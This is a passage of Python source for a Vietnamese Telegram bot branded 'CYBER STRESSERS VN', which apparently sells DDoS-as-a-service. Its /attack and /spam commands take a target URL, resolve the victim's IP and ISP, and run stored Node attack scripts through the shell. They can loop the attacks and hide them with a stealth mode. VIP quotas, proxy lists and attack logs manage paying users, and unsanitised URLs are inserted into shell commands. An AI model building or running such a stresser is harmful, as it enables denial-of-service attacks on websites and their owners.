        if get_running_tasks_count(user_id) >= user_max_concurrent:
            return await reply_error(f"⚠️ <b>Bạn đã đạt giới hạn luồng chạy (Tối đa {user_max_concurrent} luồng)!</b>")

    if not is_admin(user_id):
        if not is_vip: return await reply_error("🔒 <b>Tính năng yêu cầu đặc quyền VIP.</b>")
        if not vip_cfg['can_spam']: return await reply_error("🚫 <b>Tài khoản của bạn KHÔNG được cấp quyền AUTO SPAM!</b>")

    if user_id in looping_tasks: return await reply_error("🔄 <b>Bạn đang có vòng lặp chạy rồi!</b> Dùng /stopspam trước.")
    if len(context.args) < 2: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/spam [method] [url] [time]</code>")

    method_name, url = context.args[0], context.args[1]
    methods_data = get_all_methods()
    if method_name not in methods_data: return await reply_error("❌ <b>Phương thức không tồn tại!</b>")
        
    blacklist = [r[0] for r in db_query('SELECT domain FROM blacklist', fetch=True)]
    if parse.urlsplit(url).netloc.lower() in blacklist: return await reply_error("🛡️ <b>Mục tiêu nằm trong Blacklist!</b>")

    ip, isp_info = await lay_ip_va_isp(url)
    if not ip: return await reply_error("🌐 <b>Lỗi DNS.</b>")

    method = methods_data[method_name]
    attack_time = method['time']
    if len(context.args) > 2:
        try: attack_time = int(context.args[2])
        except ValueError: pass

    if not is_admin(user_id) and not is_vip:
        sys_global_max_time = int(get_system_setting("member_global_max_time", 60))
        if attack_time > sys_global_max_time: attack_time = sys_global_max_time
        left_quota = check_and_update_member_quota(user_id)
        if left_quota == -1: return await reply_error("❌ <b>Bạn đã sử dụng hết số lượt cho phép trong ngày!</b>")

    if not is_admin(user_id) and is_vip:
        if vip_cfg['quota'] <= 0: return await reply_error("❌ <b>Tài khoản VIP của bạn đã hết lượt!</b>")
        if attack_time > vip_cfg['max_time']: attack_time = vip_cfg['max_time']
        db_query('UPDATE vip_users SET custom_quota = ? WHERE user_id=?', (vip_cfg['quota'] - 1, user_id)) 
        await tele_backup_db(context)

    cmd = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
    username = update.message.from_user.username or update.message.from_user.full_name

    log_attack(user_id, username, url, method_name, attack_time)

    dynamic_cooldown = get_user_cooldown(user_id)
    await reply_error(f"🔥 <b>[AUTO SPAM KÍCH HOẠT]</b>\n⏱ Mỗi lượt bắn: <code>{attack_time}s</code>\n💤 Thời gian nghỉ: <code>{dynamic_cooldown}s</code>\nDùng <code>/stopspam</code> để kết thúc!")

    task = asyncio.create_task(run_spam_loop(cmd, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private))
    looping_tasks[user_id] = {'task': task, 'target': url}

async def tat_spam(update, context):
    if await check_private_block(update): return
    user_id = update.message.from_user.id
    if user_id not in looping_tasks: return await update.message.reply_text("❌ <b>Bạn không có vòng lặp nào đang chạy!</b>")
    looping_tasks[user_id]['task'].cancel()
    del looping_tasks[user_id]
    await update.message.reply_text("✅ <b>Đã tắt chế độ AUTO SPAM thành công.</b>")

async def run_spam_loop(command, update, method_name, context, user_id, url, attack_time, ip, isp_info, username, is_private):
    loop_count = 1
    try:
        while True:
            if loop_count > 1 and not is_admin(user_id):
                vip_cfg = get_vip_config(user_id)
                if vip_cfg:
                    if vip_cfg['quota'] <= 0:
                        try: await context.bot.send_message(user_id, "❌ <b>Hết Quota VIP! Vòng lặp Spam tự động dừng.</b>", parse_mode='HTML')
                        except Exception: pass
                        if user_id in looping_tasks: del looping_tasks[user_id]
                        return
                    db_query('UPDATE vip_users SET custom_quota = ? WHERE user_id=?', (vip_cfg['quota'] - 1, user_id))
                    await tele_backup_db(context)
                else:
                    left_quota = check_and_update_member_quota(user_id)
                    if left_quota == -1:
                        try: await context.bot.send_message(user_id, "❌ <b>Hết hạn mức trong ngày! Vòng lặp tự động dừng.</b>", parse_mode='HTML')
                        except Exception: pass
                        if user_id in looping_tasks: del looping_tasks[user_id]
                        return
                
                log_attack(user_id, username, url, method_name, attack_time)

            process = await asyncio.create_subprocess_shell(command)
            await process.communicate()
            loop_count += 1
            await asyncio.sleep(get_user_cooldown(user_id))
            
    except asyncio.CancelledError: return

# --- PANEL: ATTACK DASHBOARD ---
async def tao_choi(update, context):
    if await check_private_block(update): return
    user_id = update.message.from_user.id
    is_stealth = get_stealth_mode()
    is_private = update.message.chat.type == 'private'
    
    async def reply_error(text):
        if not is_stealth or is_private: await update.message.reply_text(text, parse_mode='HTML')

    if not get_bot_state() and not is_admin(user_id): return await reply_error("❌ <b>Hệ thống đang bảo trì!</b>")
        
    allowed_groups = [r[0] for r in db_query('SELECT group_id FROM groups_allowed', fetch=True)]
    if not is_private and update.message.chat.id not in allowed_groups and not is_admin(user_id): return await reply_error("🚫 <b>Nhóm chưa được cấp phép.</b>")
        
    vip_cfg = get_vip_config(user_id)
    is_u_vip = vip_cfg is not None

    if not is_admin(user_id):
        user_max_concurrent = vip_cfg['max_concurrent'] if is_u_vip else int(get_system_setting("member_max_concurrent", "3"))
        if get_running_tasks_count(user_id) >= user_max_concurrent:
            return await reply_error(f"⚠️ <b>Bạn đã đạt giới hạn luồng chạy (Tối đa {user_max_concurrent} luồng)!</b>")

    if not is_admin(user_id):
        if user_id in looping_tasks: return await reply_error("🔄 <b>Bạn đang ở chế độ AUTO SPAM!</b>")
        if active_users.get(user_id, False): return await reply_error("⏳ <b>Bạn đang có 1 tiến trình đang chạy!</b>")
        
        dynamic_cooldown = get_user_cooldown(user_id)
        time_passed = time.time() - user_cooldowns.get(user_id, 0)
        if time_passed < dynamic_cooldown: 
            return await reply_error(f"❄️ <b>Hệ thống làm mát:</b> Vui lòng đợi <code>{int(dynamic_cooldown - time_passed)}s</code>.")

    if len(context.args) < 2: return await reply_error("⚠️ <b>Cú pháp:</b> <code>/attack [method] [url] [thời gian]</code>")

    method_name, url = context.args[0], context.args[1]
    methods_data = get_all_methods()
    if method_name not in methods_data: return await reply_error("❌ <b>Phương thức không tồn tại!</b>")
        
    # --- ĐÃ SỬA LỖI: Định nghĩa biến method tại đây ---
    method = methods_data[method_name]

    blacklist = [r[0] for r in db_query('SELECT domain FROM blacklist', fetch=True)]
    if parse.urlsplit(url).netloc.lower() in blacklist: return await reply_error("🛡️ <b>Mục tiêu nằm trong Blacklist!</b>")

    ip, isp_info = await lay_ip_va_isp(url)
    if not ip: return await reply_error("🌐 <b>Lỗi DNS.</b>")

    attack_time = method['time']
    if len(context.args) > 2:
        try: attack_time = int(context.args[2])
        except ValueError: pass

    if not is_admin(user_id) and not is_u_vip:
        sys_global_max_time = int(get_system_setting("member_global_max_time", 60))
        if attack_time > sys_global_max_time: attack_time = sys_global_max_time
        left_quota = check_and_update_member_quota(user_id)
        if left_quota == -1: return await reply_error("❌ <b>Bạn đã hết hạn mức trong ngày!</b>")

    if not is_admin(user_id) and is_u_vip:
        if vip_cfg['quota'] <= 0: return await reply_error("❌ <b>Tài khoản VIP của bạn đã hết lượt tấn công!</b>")
        if attack_time > vip_cfg['max_time']: attack_time = vip_cfg['max_time']
        db_query('UPDATE vip_users SET custom_quota = ? WHERE user_id=?', (vip_cfg['quota'] - 1, user_id))

    username = update.message.from_user.username or update.message.from_user.full_name
    log_attack(user_id, username, url, method_name, attack_time)

    dashboard = (
        "⚡️ ⚡️ ⚡️ ─── [ CYBER STRESSERS VN ] ─── ⚡️ ⚡️ ⚡️\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💥 <b>⚠️ TARGET LOCKED & ENGAGED ⚠️</b>\n\n"
        f" ├── 📡 <b>Operator:</b> <code>@{escape(username)}</code> (ID: {user_id})\n"
        f" ├── 📍 <b>Target Host:</b> <code>{url}</code>\n"
        f" ├── 🧬 <b>Method:</b> <code>{method_name.upper()}</code>\n"
        f" └── ⏱ <b>Duration:</b> <code>{attack_time}s</code>\n\n"
        "👁‍🗨 [ TARGET INTELLIGENCE & RECON ]\n"
        f" ├── 🌐 <b>IP Address:</b> <code>{ip}</code>\n"
        f" └── 🖲 <b>ISP Provider:</b> <i>{escape(isp_info.get('isp', 'N/A'))}</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📟 <b>System Time:</b> <code>{get_thoi_gian_vn()}</code>"
    )
    kb = InlineKeyboardMarkup([[
        InlineKeyboardButton("📊 Monitor Host", url=f"https://check-host.net/check-http?host={url}"),
        InlineKeyboardButton("🛑 Terminate", callback_data="pkill")
    ]])
    
    if is_stealth and not is_private:
        for admin in ORIGINAL_ADMINS:
            try: await context.bot.send_message(chat_id=admin, text="🕵️‍♂️ <b>[SHADOW REPORT] Lệnh ngầm từ Group!</b>\n" + dashboard, parse_mode='HTML', reply_markup=kb)
            except Exception: pass
    else:
        await update.message.reply_text(dashboard, parse_mode='HTML', reply_markup=kb)
    
    cmd = method['command'].replace(method['url'], url).replace(str(method['time']), str(attack_time))
    active_users[user_id] = True          
    user_cooldowns[user_id] = time.time() 
    asyncio.create_task(thuc_hien_tan_cong(cmd, update, method_name, context, user_id, is_stealth, is_private))
    await tele_backup_db(context)

async def thuc_hien_tan_cong(command, update, method_name, context, user_id, is_stealth, is_private):
    try:
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        res = f"✅ <b>Tiến trình hoàn tất:</b> <code>{method_name.upper()}</code>"
    except Exception: res = "❌ <b>Lỗi thực thi lệnh!</b>"
    finally: active_users[user_id] = False     
        
    if is_stealth and not is_private:
        for admin in ORIGINAL_ADMINS:
            try: await context.bot.send_message(chat_id=admin, text=f"{res} (Từ ID: {user_id})", parse_mode='HTML')
            except Exception: pass
    else:
        try: await update.message.reply_text(res, parse_mode='HTML')
        except Exception: pass

# --- QUẢN TRỊ ADMIN ---
async def vps_stats(update, context):
    if not is_admin(update.message.from_user.id): return
    cpu = psutil.cpu_percent(interval=0.5)
    ram = psutil.virtual_memory().percent
    await update.message.reply_text(f"🖥 <b>SERVER MONITORING</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n├ ⚙️ <b>CPU Load:</b> <code>{cpu}%</code>\n└ 🧠 <b>RAM Usage:</b> <code>{ram}%</code>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰", parse_mode='HTML')

async def danh_sach_proxy(update, context):
    if not is_admin(update.message.from_user.id): return
    try:
        txt_files = [f for f in os.listdir('.') if os.path.isfile(f) and f.endswith('.txt')]
        if not txt_files: return await update.message.reply_text("📭 <b>Không tìm thấy file .txt nào!</b>", parse_mode='HTML')
        msg = "📂 <b>THỐNG KÊ SỐ LƯỢNG PROXIES</b> 📂\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
        for file in txt_files:
            try:
                with open(file, 'r', encoding='utf-8') as f: line_count = sum(1 for line in f if line.strip())
                msg += f"📄 <code>{file}</code>: <b>{line_count:,}</b> proxies hoạt động.\n"
            except Exception: msg += f"📄 <code>{file}</code> - <i>Lỗi đọc dữ liệu</i>\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e: await update.message.reply_text(f"❌ <b>Lỗi:</b> {str(e)}", parse_mode='HTML')

async def tai_file_proxy(update, context):
    if not is_admin(update.message.from_user.id): return
    if len(context.args) < 1: return await update.message.reply_text("⚠️ <b>Cú pháp:</b> <code>/dlproxies [tên_file.txt]</code>", parse_mode='HTML')
    filename = context.args[0]
    if not filename.endswith('.txt'): filename += '.txt'
    if not os.path.exists(filename): return await update.message.reply_text(f"❌ <b>Tệp <code>{filename}</code> không tồn tại!</b>", parse_mode='HTML')
    try:
        with open(filename, 'rb') as doc:
            await context.bot.send_document(chat_id=update.effective_chat.id, document=doc, filename=filename, caption=f"💾 File proxies: {filename}")
    except Exception as e: await update.message.reply_text(f"❌ <b>Sự cố:</b> {str(e)}", parse_mode='HTML')

async def quan_ly_admin(update, context, action):
    if update.message.from_user.id not in ORIGINAL_ADMINS: return
    try: target_id = int(context.args[0])
    except: return await update.message.reply_text("⚠️ <b>Cú pháp:</b> <code>/addadmin [id]</code>", parse_mode='HTML')
    if action == "add":
        db_query('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (target_id,))
        await update.message.reply_text(f"👑 <b>Đã cấp quyền Admin phụ cho ID:</b> <code>{target_id}</code>", parse_mode='HTML')
    else:
        db_query('DELETE FROM admins WHERE user_id=?', (target_id,))
        await update.message.reply_text(f"❌ <b>Đã gỡ quyền Admin của ID:</b> <code>{target_id}</code>", parse_mode='HTML')
    await tele_backup_db(context)

async def quan_ly_chay_rieng(update, context, action):
    if not is_admin(update.message.from_user.id): return
    try: target_id = int(context.args[0])
    except: return await update.message.reply_text("⚠️ <b>Cú pháp:</b> <code>/allowprivate [id]</code>", parse_mode='HTML')
    if action == "add":
        db_query('INSERT OR IGNORE INTO private_allowed (user_id) VALUES (?)', (target_id,))
        await update.message.reply_text(f"🔓 <b>Đã cấp quyền chạy riêng cho ID:</b> <code>{target_id}</code>.", parse_mode='HTML')
    else:
        db_query('DELETE FROM private_allowed WHERE user_id=?', (target_id,))
        await update.message.reply_text(f"🔒 <b>Đã thu hồi quyền chạy riêng của ID:</b> <code>{target_id}</code>.", parse_mode='HTML')
    await tele_backup_db(context)

async def xem_lich_su_tan_cong(update, context):
    if not is_admin(update.message.from_user.id): return
    rows = db_query('SELECT username, target, method, duration, time_at FROM attack_logs ORDER BY id DESC LIMIT 15', fetch=True)
    if not rows: return await update.message.reply_text("📭 <b>Lịch sử trống!</b>", parse_mode='HTML')
    
    msg = (
        "⚡️ ─── [ CYBER STRESSERS VN ] ─── ⚡️\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📜 <b>HỆ THỐNG GHI NHẬN LỊCH SỬ KHAI HỎA</b>\n\n"
    )
    for r in rows:
        msg += f" 🏴‍☠️ <code>{escape(r[0])}</code> ➔ 🎯 <code>{escape(r[1])}</code>\n      ⚡️ <b>{r[2].upper()}</b> ({r[3]}s) | 🕒 <i>{r[4]}</i>\n ───────────────────────────────────\n"
    await update.message.reply_text(msg, parse_mode='HTML')

async def xoa_lich_su_tan_cong(update, context):
    if not is_admin(update.message.from_user.id): return
    db_query('DELETE FROM attack_logs')
    await update.message.reply_text("🗑 <b>Đã xóa sạch lịch sử!</b>", parse_mode='HTML')
    await tele_backup_db(context)

async def quan_ly_he_thong_com(update, context):
    if not is_admin(update.message.from_user.id): return
    if len(context.args) < 4:
        curr_concurrent = get_system_setting("member_max_concurrent", "3")
        curr_max_time = get_system_setting("member_global_max_time", "60")
        curr_daily_limit = get_system_setting("member_daily_limit", "10")
        curr_ref_needed = get_system_setting("ref_needed_for_vip", "5")
        return await update.message.reply_text(
            f"⚙️ <b>HẠN MỨC MEMBER THƯỜNG:</b>\n"
            f"├ Luồng tối đa: <code>{curr_concurrent}</code>\n"
            f"├ Thời gian tối đa: <code>{curr_max_time}s</code>\n"
            f"├ Hạn mức ngày: <code>{curr_daily_limit}</code>\n"
            f"└ Mốc ref mở VIP1: <code>{curr_ref_needed}</code>\n\n"
            f"⚠️ <b>Cú pháp sửa:</b> <code>/setsystem [luồng] [time] [lượt] [ref]</code>", parse_mode='HTML'
        )
    try:
        concurrent, max_time = int(context.args[0]), int(context.args[1])
        daily_limit, ref_needed = int(context.args[2]), int(context.args[3])
    except ValueError: return await update.message.reply_text("⚠️ <b>Lỗi tham số phải là số!</b>", parse_mode='HTML')
        
    db_query('REPLACE INTO settings (key, value) VALUES ("member_max_concurrent", ?)', (str(concurrent),))
    db_query('REPLACE INTO settings (key, value) VALUES ("member_global_max_time", ?)', (str(max_time),))
    db_query('REPLACE INTO settings (key, value) VALUES ("member_daily_limit", ?)', (str(daily_limit),))
    db_query('REPLACE INTO settings (key, value) VALUES ("ref_needed_for_vip", ?)', (str(ref_needed),))
    await update.message.reply_text(f"✅ <b>Đã cập nhật cấu hình Member thường!</b>", parse_mode='HTML')
    await tele_backup_db(context)

async def thiet_lap_goi_vip(update, context):
    if not is_admin(update.message.from_user.id): return
    if len(context.args) < 7:
        return await update.message.reply_text("⚠️ <b>Cú pháp:</b> <code>/setpackage [tên_gói] [time] [quota] [spam:1/0] [schedule:1/0] [cooldown] [luồng]</code>", parse_mode='HTML')
    try:
        pkg_name = context.args[0].upper()
        m_time, quota, spam, sch, cd, mc = int(context.args[1]), int(context.args[2]), int(context.args[3]), int(context.args[4]), int(context.args[5]), int(context.args[6])
    except ValueError: return await update.message.reply_text("⚠️ <b>Tham số kỹ thuật phải là số nguyên!</b>", parse_mode='HTML')

    db_query('REPLACE INTO vip_packages VALUES (?, ?, ?, ?, ?, ?, ?)', (pkg_name, m_time, quota, spam, sch, cd, mc))
    await update.message.reply_text(f"✅ <b>Đã thiết lập cấu trúc Gói <code>{pkg_name}</code> thành công!</b>", parse_mode='HTML')
    await tele_backup_db(context)

async def quan_ly_vip_user(update, context, action):
    if not is_admin(update.message.from_user.id): return
    if action == "add":
        if len(context.args) < 2: return await update.message.reply_text("⚠️ <b>Cú pháp:</b> <code>/vipuser [tên_gói] [id_user]</code>", parse_mode='HTML')
        pkg_name = context.args[0].upper()
        try: uid = int(context.args[1])
        except ValueError: return await update.message.reply_text("⚠️ <b>ID không hợp lệ!</b>", parse_mode='HTML')

        pkg_check = db_query('SELECT package_name FROM vip_packages WHERE package_name=?', (pkg_name,), fetch=True)
        if not pkg_check: return await update.message.reply_text(f"❌ <b>Gói <code>{pkg_name}</code> không tồn tại!</b>", parse_mode='HTML')

        db_query('REPLACE INTO vip_users (user_id, package_name) VALUES (?, ?)', (uid, pkg_name))
        await update.message.reply_text(f"👑 <b>Đã kích hoạt gói <code>{pkg_name}</code> cho ID <code>{uid}</code>.</b>", parse_mode='HTML')
    else:
        try: uid = int(context.args[0])
        except ValueError: return await update.message.reply_text("⚠️ <b>ID không hợp lệ!</b>", parse_mode='HTML')
        db_query('DELETE FROM vip_users WHERE user_id=?', (uid,))
        await update.message.reply_text(f"❌ <b>Đã hủy quyền VIP của ID:</b> <code>{uid}</code>", parse_mode='HTML')
    await tele_backup_db(context)

async def sua_rieng_vip_user(update, context):
    if not is_admin(update.message.from_user.id): return
    if len(context.args) < 3: return await update.message.reply_text("⚠️ <b>Cú pháp:</b> <code>/editvip [id] [quota/time/cooldown/concurrent] [giá_trị]</code>", parse_mode='HTML')
    try:
        uid = int(context.args[0])
        field = context.args[1].lower()
        val = int(context.args[2])
    except ValueError: return await update.message.reply_text("⚠️ <b>Thông số phải là số!</b>", parse_mode='HTML')

    if not check_vip_status(uid): return await update.message.reply_text("❌ <b>ID này là người thường!</b>", parse_mode='HTML')

    if field == "quota": db_query('UPDATE vip_users SET custom_quota = ? WHERE user_id = ?', (val, uid))
    elif field == "time": db_query('UPDATE vip_users SET custom_max_time = ? WHERE user_id = ?', (val, uid))
    elif field == "cooldown": db_query('UPDATE vip_users SET custom_cooldown = ? WHERE user_id = ?', (val, uid))
    elif field == "concurrent": db_query('UPDATE vip_users SET custom_max_concurrent = ? WHERE user_id = ?', (val, uid))
    else: return await update.message.reply_text("❌ <b>Thuộc tính sai!</b>", parse_mode='HTML')

    await update.message.reply_text(f"✅ <b>Đã đổi riêng <code>{field}</code> của ID <code>{uid}</code> thành <code>{val}</code>!</b>", parse_mode='HTML')
    await tele_backup_db(context)

async def stop_process(update, context):
    if not is_admin(update.effective_user.id): return
    try:
        process = await asyncio.create_subprocess_shell("pkill -9 -f node")
        await process.communicate()
        active_users.clear()
        for t_id, t_info in scheduled_tasks.items(): t_info['task'].cancel()
        scheduled_tasks.clear()
        for u_id, sp_info in looping_tasks.items(): sp_info['task'].cancel()
        looping_tasks.clear()
    except Exception as e: print(e)
    
    text = "⏹ <b>Hệ thống đã dọn dẹp và hủy toàn bộ tiến trình Node!</b>"
    if update.callback_query:
        await update.callback_query.answer("Đã dừng khẩn cấp!")
        await update.callback_query.message.reply_text(text, parse_mode='HTML')
    else: await update.message.reply_text(text, parse_mode='HTML')

async def bot_on(update, context):
    if is_admin(update.message.from_user.id): set_bot_state(True); await update.message.reply_text("✅ <b>Hệ thống ONLINE.</b>", parse_mode='HTML')

async def bot_off(update, context):
    if is_admin(update.message.from_user.id): set_bot_state(False); await update.message.reply_text("❌ <b>Hệ thống OFFLINE.</b>", parse_mode='HTML')

async def them_phuong_thuc(update, context):
    if not is_admin(update.message.from_user.id): return
    method_name, req_method, url = context.args[0], context.args[1].upper(), context.args[2]
    attack_time = 60
    if req_method not in ['GET', 'POST', 'NONE']: 
        return await update.message.reply_text("⚠️ <b>Cú pháp:</b> Loại method phải là <code>GET</code>, <code>POST</code> hoặc <code>NONE</code>.", parse_mode='HTML')
    if 'timeset' in context.args:
        try: attack_time = int(context.args[context.args.index('timeset') + 1])
        except ValueError: return await update.message.reply_text("🔥 <b>Thời gian không hợp lệ.</b>", parse_mode='HTML')
    visibility = 'VIP' if '[vip]' in context.args else 'MEMBER'
    extra_args = [arg for arg in context.args[3:] if arg not in ['[vip]', '[member]', 'timeset']]
    cmd = f"node --max-old-space-size=65536 {method_name} {url} " + " ".join(extra_args) if req_method == 'NONE' else f"node --max-old-space-size=65536 {method_name} {req_method} {url} " + " ".join(extra_args)
    db_query('REPLACE INTO methods (name, type, url, time, visibility, command) VALUES (?, ?, ?, ?, ?, ?)', (method_name, req_method, url, attack_time, visibility, cmd))
    await update.message.reply_text(f"✅ <b>Đã thêm phương thức:</b> <code>{method_name}</code>", parse_mode='HTML')
    await tele_backup_db(context)

async def xoa_phuong_thuc(update, context):
    if not is_admin(update.message.from_user.id): return
    db_query('DELETE FROM methods WHERE name=?', (context.args[0],))
    await update.message.reply_text(f"✅ <b>Đã xóa phương thức:</b> <code>{context.args[0]}</code>", parse_mode='HTML')
    await tele_backup_db(context)

async def set_member_cooldown(update, context):
    if not is_admin(update.message.from_user.id): return
    try: seconds = int(context.args[0])
    except: return await update.message.reply_text("⚠️ <b>Cú pháp:</b> <code>/setcooldown [s]</code>", parse_mode='HTML')
    db_query('REPLACE INTO settings (key, value) VALUES ("member_cooldown", ?)', (str(seconds),))
    await update.message.reply_text(f"⚙️ <b>Thời gian nghỉ Member đổi thành <code>{seconds}s</code>.</b>", parse_mode='HTML')
    await tele_backup_db(context)

async def them_nhom(update, context):
    if not is_admin(update.message.from_user.id): return
    try: gid = int(context.args[0])
    except: return await update.message.reply_text("⚠️ <b>ID nhóm không hợp lệ.</b>", parse_mode='HTML')
    db_query('INSERT OR IGNORE INTO groups_allowed (group_id) VALUES (?)', (gid,))
    await update.message.reply_text(f"✅ <b>Đã cấp phép nhóm:</b> <code>{gid}</code>", parse_mode='HTML')
    await tele_backup_db(context)

async def xoa_nhom(update, context):
    if not is_admin(update.message.from_user.id): return
    try: gid = int(context.args[0])
    except: return await update.message.reply_text("⚠️ <b>ID nhóm không hợp lệ.</b>", parse_mode='HTML')
    db_query('DELETE FROM groups_allowed WHERE group_id=?', (gid,))
    await update.message.reply_text(f"❌ <b>Đã hủy phép nhóm:</b> <code>{gid}</code>", parse_mode='HTML')
    await tele_backup_db(context)

async def quan_ly_blacklist(update, context, action):
    if not is_admin(update.message.from_user.id): return
    domain = context.args[0].lower()
    if action == "add":
        db_query('INSERT OR IGNORE INTO blacklist (domain) VALUES (?)', (domain,))
        await update.message.reply_text(f"✅ <b>Đã đưa vào Blacklist:</b> <code>{domain}</code>", parse_mode='HTML')
    else:
        db_query('DELETE FROM blacklist WHERE domain=?', (domain,))
        await update.message.reply_text(f"✅ <b>Đã gỡ khỏi Blacklist:</b> <code>{domain}</code>", parse_mode='HTML')
    await tele_backup_db(context)

# --- CHỦ ĐỘNG BACKUP DB ---
async def chu_dong_backup_db(update, context):
    if not is_admin(update.message.from_user.id): return
    await update.message.reply_text("📦 <i>Đang đóng gói và gửi cấu trúc dữ liệu...</i>", parse_mode='HTML')
    await tele_backup_db(context)

async def upload_db(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.message.from_user.id): return
    if update.message.document:
        if update.message.document.file_name == DB_FILE:
            file = await update.message.document.get_file()
            await file.download_to_drive(custom_path=DB_FILE)
            await update.message.reply_text("✅ <b>Đã tiếp nhận cấu trúc dữ liệu mới!</b>\nToàn bộ thông tin VIP và Quota đã được khôi phục đồng bộ.", parse_mode='HTML')
        else:
            await update.message.reply_text(f"❌ <b>Sai tên tệp!</b> File tải lên phải đặt tên chuẩn là <code>{DB_FILE}</code>", parse_mode='HTML')
    else:
        await update.message.reply_text("⚠️ <b>Cú pháp:</b> Đính kèm file <code>bot_database.db</code> kèm dòng tin nhắn ghi lệnh <code>/upload</code>", parse_mode='HTML')

async def help_admin(update, context):
    if not is_admin(update.message.from_user.id): return
    msg = (
        "◤                                            ◥\n"
        "  ⚡️ CYBER STRESSERS VN - ADMIN PANEL v5.0\n"
        "◣                                            ◢\n\n"
        "<code>┌─── [ SYSTEM OPERATIONS ] ───\n"
        "│ ➔ /on /off    : Toggle Bot State\n"
        "│ ➔ /botro      : Stealth Mode ON/OFF\n"
        "│ ➔ /pkill      : Kill All Ghost Nodes\n"
        "│ ➔ /vps        : System Resources Check\n"
        "│ ➔ /backup     : Dump Database to Telegram\n"
        "│ ➔ /upload     : Hot-Reload database.db\n"
        "└─────────────────────────────\n\n"
        "┌─── [ ACCESS & LOGS CONTROL ] ───\n"
        "│ ➔ /addadmin   /deladmin    : Manage Admins\n"
        "│ ➔ /allowprivate /delprivate  : Group Access\n"
        "│ ➔ /logs       /clearlogs   : Attack History\n"
        "│ ➔ /proxies    /dlproxies   : Proxy Sync\n"
        "└─────────────────────────────\n\n"
        "┌─── [ MEMBERSHIP & PACKAGES ] ───\n"
        "│ ➔ /setpackage : Config global VIP ranks\n"
        "│ ➔ /vipuser    : Grant VIP access to User\n"
        "│ ➔ /editvip    : Override individual quota\n"
        "│ ➔ /delvip     : Revoke VIP permission\n"
        "└─────────────────────────────\n\n"
        "[!] Master Core Connection: ACTIVE</code>"
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("⚙️ Quản lý Server", url="https://google.com")]])
    await update.message.reply_text(msg, parse_mode='HTML', reply_markup=kb)

def make_handler(func, min_args, help_text, *extra_args):
    async def wrapper(update, context):
        if len(context.args) < min_args: 
            return await update.message.reply_text(f"⚠️ <b>Lỗi cú pháp:</b> {help_text}", parse_mode='HTML')
        if extra_args: await func(update, context, *extra_args)
        else: await func(update, context)
    return wrapper

# --- HÀM MAIN ---
def main():
    init_db()
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", help_group))
    app.add_handler(CommandHandler("help", help_group))
    app.add_handler(CommandHandler("me", thong_tin_vip)) 
    app.add_handler(CommandHandler("check", check_website))
    app.add_handler(CommandHandler("methods", danh_sach_phuong_thuc))
    app.add_handler(CommandHandler("attack", tao_choi))
    app.add_handler(CommandHandler("spam", bat_spam))
    app.add_handler(CommandHandler("stopspam", tat_spam))
    app.add_handler(CommandHandler("schedule", dat_lich))
    app.add_handler(CommandHandler("delschedule", huy_lich))
    
    app.add_handler(CommandHandler("botro", toggle_botro))
    app.add_handler(CommandHandler("pkill", stop_process))
    app.add_handler(CallbackQueryHandler(stop_process, pattern="^pkill$"))
    app.add_handler(CommandHandler("on", bot_on))
    app.add_handler(CommandHandler("off", bot_off))
    app.add_handler(CommandHandler("vps", vps_stats))
    app.add_handler(CommandHandler("proxies", danh_sach_proxy))
    app.add_handler(CommandHandler("dlproxies", tai_file_proxy))
    app.add_handler(CommandHandler("setsystem", quan_ly_he_thong_com))
    app.add_handler(CommandHandler("setcooldown", set_member_cooldown))

    app.add_handler(CommandHandler("addadmin", make_handler(quan_ly_admin, 1, "/addadmin [id]", "add")))
    app.add_handler(CommandHandler("deladmin", make_handler(quan_ly_admin, 1, "/deladmin [id]", "remove")))
    app.add_handler(CommandHandler("allowprivate", make_handler(quan_ly_chay_rieng, 1, "/allowprivate [id]", "add")))
    app.add_handler(CommandHandler("delprivate", make_handler(quan_ly_chay_rieng, 1, "/delprivate [id]", "remove")))
    app.add_handler(CommandHandler("logs", xem_lich_su_tan_cong))
    app.add_handler(CommandHandler("clearlogs", xoa_lich_su_tan_cong))
    
    app.add_handler(CommandHandler("setpackage", thiet_lap_goi_vip))
    app.add_handler(CommandHandler("editvip", sua_rieng_vip_user))
    app.add_handler(CommandHandler("backup", chu_dong_backup_db))
    
    app.add_handler(CommandHandler("upload", upload_db))
    app.add_handler(MessageHandler(filters.Document.ALL, upload_db))

    app.add_handler(CommandHandler("helpadmin", help_admin))
    app.add_handler(CommandHandler("add", make_handler(them_phuong_thuc, 3, "/add [name] [GET/POST/NONE] [url] ...")))
    app.add_handler(CommandHandler("del", make_handler(xoa_phuong_thuc, 1, "/del [name]")))
    app.add_handler(CommandHandler("vipuser", make_handler(quan_ly_vip_user, 2, "/vipuser [tên_gói] [id]", "add")))
    app.add_handler(CommandHandler("delvip", make_handler(quan_ly_vip_user, 1, "/delvip [id]", "remove")))
    app.add_handler(CommandHandler("addgroup", make_handler(them_nhom, 1, "/addgroup [id]")))
    app.add_handler(CommandHandler("delgroup", make_handler(xoa_nhom, 1, "/delgroup [id]")))
    app.add_handler(CommandHandler("addblacklist", make_handler(quan_ly_blacklist, 1, "/addblacklist [domain]", "add")))
    app.add_handler(CommandHandler("delblacklist", make_handler(quan_ly_blacklist, 1, "/delblacklist [domain]", "remove")))
    
    print("🚀 Bot ZenTra Víp Pro!")
    app.run_polling()

if __name__ == "__main__": main()